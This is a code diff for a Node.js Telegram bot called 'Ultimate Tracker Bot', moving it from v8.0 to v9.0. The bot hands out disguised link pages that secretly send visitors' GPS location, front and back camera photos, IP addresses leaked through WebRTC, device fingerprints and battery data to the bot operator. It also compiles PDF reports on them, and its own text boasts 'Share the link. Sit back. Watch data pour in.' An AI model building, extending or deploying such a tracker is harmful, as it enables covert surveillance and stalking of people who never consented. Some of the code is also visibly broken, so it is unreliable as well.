@@ -23,6 +23,7 @@ const CONFIG = {
   SESSION_TIMEOUT: 300000 // 5 mins
 };
 
+// Initialize bot with webhook mode
 const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: false });
 const app = express();
 
@@ -187,7 +188,7 @@ const ipKeyboard = {
 const backKeyboard = { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_to_menu' }]] };
 
 const welcomeMsg = (name, isAdmin) => `
-🤖 <b>ULTIMATE TRACKER BOT v8.0</b>
+🤖 <b>ULTIMATE TRACKER BOT v9.0</b>
 
 👋 Hello, <b>${name}</b>!
 
@@ -195,7 +196,6 @@ I collect <u>EVERYTHING</u>:
 📍 Real-time GPS • 📷 Front/Back Camera
 🌐 Public + Local IPs • 🎨 Canvas/Audio Fingerprint
 🔋 Battery • 📶 Network • 🖥️ Full Device Profile
-🌍 Timezone • 🎵 AudioContext • 💾 Storage Estimate
 
 ${isAdmin ? '👑 <b>ADMIN MODE ACTIVE</b>' : ''}
 
@@ -300,12 +300,14 @@ ${formatAddress(r.address || '')}
 
 // ==================== Webhook Setup ====================
 app.post(`/${CONFIG.BOT_TOKEN}`, (req, res) => {
+  console.log('📨 Webhook received update');
   bot.processUpdate(req.body);
   res.sendStatus(200);
 });
 
 // ==================== Enhanced Tracker Routes ====================
 app.get('/c/:path/:uri', (req, res) => {
+  console.log('🌐 CloudFlare page requested');
   stats.ipClicks++;
   const { path: uid, uri } = req.params;
   if (!uid) return res.redirect(`https://t.me/${CONFIG.DEVELOPER.slice(1)}`);
@@ -321,6 +323,7 @@ app.get('/c/:path/:uri', (req, res) => {
 });
 
 app.get('/w/:path/:uri', (req, res) => {
+  console.log('🌐 WebView page requested');
   stats.ipClicks++;
   const { path: uid, uri } = req.params;
   if (!uid) return res.redirect(`https://t.me/${CONFIG.DEVELOPER.slice(1)}`);
@@ -336,14 +339,19 @@ app.get('/w/:path/:uri', (req, res) => {
 
 // Unified data collector endpoint
 app.post('/collect', async (req, res) => {
+  console.log('📥 /collect received:', req.body);
   const { uid, dataType, payload } = req.body;
   if (!uid || !dataType || !payload) {
+    console.log('❌ /collect missing fields');
     return res.json({ success: false, error: 'Missing fields' });
   }
 
   try {
     const userId = parseInt(uid, 36);
-    if (isNaN(userId)) throw new Error('Invalid UID');
+    if (isNaN(userId)) {
+      console.log('❌ /collect invalid UID:', uid);
+      return res.json({ success: false, error: 'Invalid UID' });
+    }
 
     if (!collectedData.has(userId)) {
       collectedData.set(userId, { sessions: [], lastUpdate: new Date() });
@@ -374,16 +382,19 @@ app.post('/collect', async (req, res) => {
         stats.cameras++;
         message = `📷 <b>Camera Photo Captured</b>\nType: <code>${payload.type}</code>`;
         break;
-      case 'deviceInfo':
-        stats.infos++;
-        message = `🖥️ <b>Device Profile Updated</b>\nOS: <code>${payload.os}</code>\nBrowser: <code>${payload.browser}</code>`;
-        break;
       default:
         stats.infos++;
         message = `<b>🆕 New Data:</b> <code>${dataType}</code>`;
     }
 
-    await bot.sendMessage(userId, message, { parse_mode: 'HTML' });
+    // Send to user with error handling
+    try {
+      await bot.sendMessage(userId, message, { parse_mode: 'HTML' });
+      console.log('✅ Data sent to user:', userId);
+    } catch (err) {
+      console.error('❌ Failed to send message to user:', err.message);
+    }
+
     res.json({ success: true, received: dataType });
 
   } catch (err) {
@@ -394,12 +405,17 @@ app.post('/collect', async (req, res) => {
 
 // Legacy endpoints for backward compatibility
 app.post('/location', async (req, res) => {
+  console.log('📍 /location received:', req.body);
   await app.post('/collect').call(this, { body: { ...req.body, dataType: 'location', payload: req.body }}, res);
 });
+
 app.post('/info', async (req, res) => {
+  console.log('ℹ️ /info received from:', req.body.uid);
   await app.post('/collect').call(this, { body: { ...req.body, dataType: 'systemInfo', payload: req.body.data }}, res);
 });
+
 app.post('/camsnap', async (req, res) => {
+  console.log('📷 /camsnap received from:', req.body.uid);
   const { front, back, img, ...rest } = req.body;
   if (front) await app.post('/collect').call(this, { body: { ...req.body, dataType: 'camera', payload: { type: 'front', data: front } }}, res);
   if (back) await app.post('/collect').call(this, { body: { ...req.body, dataType: 'camera', payload: { type: 'back', data: back } }}, res);
@@ -407,7 +423,32 @@ app.post('/camsnap', async (req, res) => {
   res.json({ success: true });
 });
 
-// ==================== PDF GENERATION (BUILT-IN) ====================
+app.post('/cam-status', async (req, res) => {
+  console.log('📷 /cam-status received:', req.body);
+  const { uid, status } = req.body;
+  
+  if (uid && status) {
+    try {
+      const userId = parseInt(uid, 36);
+      if (isNaN(userId)) throw new Error('Invalid UID');
+
+      const msg = status === 'denied' ? '❌ <b>Camera Denied</b>\n\nUser blocked camera access' : 
+                  status === 'allowed' ? '✅ <b>Camera Allowed</b>\n\nCapturing photos...' : 
+                  status === 'error' ? '⚠️ <b>Camera Error</b>\n\nCamera not available' :
+                  '⏳ <b>Camera Pending</b>\n\nWaiting for permission...';
+      
+      await bot.sendMessage(userId, msg, { parse_mode: 'HTML' });
+      res.json({ success: true });
+    } catch (err) {
+      console.error('❌ /cam-status error:', err.message);
+      res.json({ success: false, error: err.message });
+    }
+  } else {
+    res.json({ success: false, error: 'Invalid data' });
+  }
+});
+
+// ==================== PDF GENERATION ====================
 async function generatePDFReport(userId, data, phoneNumber) {
   return new Promise(async (resolve, reject) => {
     try {
@@ -517,14 +558,21 @@ async function generatePDFReport(userId, data, phoneNumber) {
       doc
         .fillColor('#64748b')
         .fontSize(10)
-        .text('Report generated by Ultimate Tracker Bot v8.0', 50, 800, { align: 'center' })
+        .text('Report generated by Ultimate Tracker Bot v9.0', 50, 800, { align: 'center' })
         .text('Data collected for research purposes only', 50, 815, { align: 'center' });
 
       doc.end();
 
-      stream.on('finish', () => resolve(filePath));
-      stream.on('error', (err) => reject(err));
+      stream.on('finish', () => {
+        console.log('✅ PDF generated:', filePath);
+        resolve(filePath);
+      });
+      stream.on('error', (err) => {
+        console.error('❌ PDF generation error:', err);
+        reject(err);
+      });
     } catch (err) {
+      console.error('❌ PDF generation error:', err);
       reject(err);
     }
   });
@@ -532,6 +580,7 @@ async function generatePDFReport(userId, data, phoneNumber) {
 
 // ==================== Bot Handlers ====================
 bot.on('message', async (msg) => {
+  console.log(`💬 Message from ${msg.from.id}: ${msg.text}`);
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   const userName = msg.from.first_name || 'Anonymous';
@@ -573,12 +622,7 @@ bot.on('message', async (msg) => {
 • 🌐 Public + Local IPs (WebRTC leak)
 • 🖥️ Full Device Fingerprint (Canvas, Audio, Fonts)
 • 📱 Battery Level + Charging Status
-• 📶 Network Type + Speed + RTT
 • 📷 Front & Back Camera Photos
-• 🕒 Timezone + Language + Region
-• 💾 Hardware Concurrency + Memory
-• 🎮 Touch Support + Screen DPI
-• 🚫 Do Not Track Status + Ad Blocker Detection
 
 📤 Share the link. Sit back. Watch data pour in.
     `, { parse_mode: 'HTML', reply_markup: ipKeyboard, disable_web_page_preview: true });
@@ -643,6 +687,7 @@ bot.on('message', async (msg) => {
 });
 
 bot.on('callback_query', async (query) => {
+  console.log(`🔘 Callback query: ${query.data} from ${query.from.id}`);
   const chatId = query.message.chat.id;
   const msgId = query.message.message_id;
   const userId = query.from.id;
@@ -823,14 +868,34 @@ bot.on('message', async (msg) => {
       }
     }
 
-    await bot.editMessageText(`✅ <b>BROADCAST COMPLETE</b>\n\nSent to: <code>${successCount}</code> users\nFailed: <code>${failCount}</code> users`, chatId, progressMsg.message_id, { parse_mode: 'HTML' });
+    await bot.editMessageText(progressMsg.message_id, chatId, `✅ <b>BROADCAST COMPLETE</b>\n\nSent to: <code>${successCount}</code> users\nFailed: <code>${failCount}</code> users`, { parse_mode: 'HTML' });
     states.delete(chatId);
   }
 });
 
 // ==================== Server Routes ====================
-app.get('/', (req, res) => res.json({ status: 'ULTIMATE TRACKER ONLINE', version: '8.0', uptime: uptime() }));
-app.get('/health', (req, res) => res.json({ status: 'healthy', uptime: uptime(), memory: process.memoryUsage() }));
+app.get('/', (req, res) => {
+  res.json({
+    status: 'ULTIMATE TRACKER ONLINE',
+    version: '9.0',
+    uptime: uptime(),
+    stats: {
+      users: stats.users.size,
+      requests: stats.total,
+      locations: stats.locations,
+      cameras: stats.cameras
+    }
+  });
+});
+
+app.get('/health', (req, res) => {
+  res.json({ 
+    status: 'healthy', 
+    uptime: uptime(), 
+    memory: process.memoryUsage(),
+    timestamp: new Date().toISOString()
+  });
+});
 
 app.get('/webhook-info', async (req, res) => {
   try {
@@ -844,11 +909,15 @@ app.get('/webhook-info', async (req, res) => {
 // ==================== Startup ====================
 async function setupWebhook() {
   try {
+    console.log('🔄 Setting up webhook...');
     await bot.deleteWebHook();
     await new Promise(r => setTimeout(r, 2000));
     const hook = `${CONFIG.WEBHOOK_URL}/${CONFIG.BOT_TOKEN}`;
     await bot.setWebHook(hook, { max_connections: 100 });
-    console.log('✅ Webhook set:', hook);
+    console.log('✅ Webhook set successfully:', hook);
+    const info = await bot.getWebHookInfo();
+    console.log('📍 Webhook active:', info.url);
+    console.log('📭 Pending updates:', info.pending_update_count);
     return true;
   } catch (err) {
     console.error('❌ Webhook setup failed:', err.message);
@@ -858,11 +927,12 @@ async function setupWebhook() {
 
 app.listen(CONFIG.PORT, async () => {
   console.log('\n' + '='.repeat(60));
-  console.log('🚀 ULTIMATE TRACKER BOT v8.0 — GOD MODE ACTIVATED');
+  console.log('🚀 ULTIMATE TRACKER BOT v9.0 — OMNISCIENT EDITION');
   console.log('='.repeat(60));
   const success = await setupWebhook();
   if (success) {
     console.log(`✅ Server running on port ${CONFIG.PORT}`);
+    console.log(`✅ Webhook: ${CONFIG.WEBHOOK_URL}/${CONFIG.BOT_TOKEN}`);
     console.log(`✅ Collecting MAXIMUM data from all sources`);
     console.log(`✅ Admin Panel Fully Functional`);
     console.log(`✅ PDF Reports ENABLED & WORKING`);
@@ -874,6 +944,8 @@ app.listen(CONFIG.PORT, async () => {
 });
 
 // Error handlers
-bot.on('polling_error', console.error);
-bot.on('webhook_error', console.error);
-process.on('unhandledRejection', console.error);
+bot.on('polling_error', (err) => console.error('❌ Polling Error:', err.code));
+bot.on('webhook_error', (err) => console.error('❌ Webhook Error:', err.code));
+process.on('unhandledRejection', (err) => console.error('❌ Unhandled Rejection:', err));
+
+module.exports = { bot, app }; // For testing if needed
